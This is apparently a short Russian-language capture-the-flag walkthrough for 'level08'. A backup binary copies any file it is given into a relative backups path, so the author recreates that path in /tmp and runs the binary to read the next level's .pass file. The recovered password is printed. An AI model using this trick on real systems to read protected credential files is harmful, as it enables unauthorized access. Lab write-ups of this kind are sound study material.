```
$> ./level08 
Usage: ./level08 filename
ERROR: Failed to open (null)
```
Как мы видим, программа принимает какой-то файл своим аргументом.  
Попробуем передать .pass файл:
```
$> ./level08 ~level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Как можно заметить, программа пытается открыть ```./backups//home/users/level09/.pass```.  
Попробуем создать этот путь в ```/tmp```.

```
$> cd /tmp
$> mkdir -p ./backups//home/users/level09/
```
Пробуем запустить программу: 
```
$> ~/level08 ~/level09/.pass

$> cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
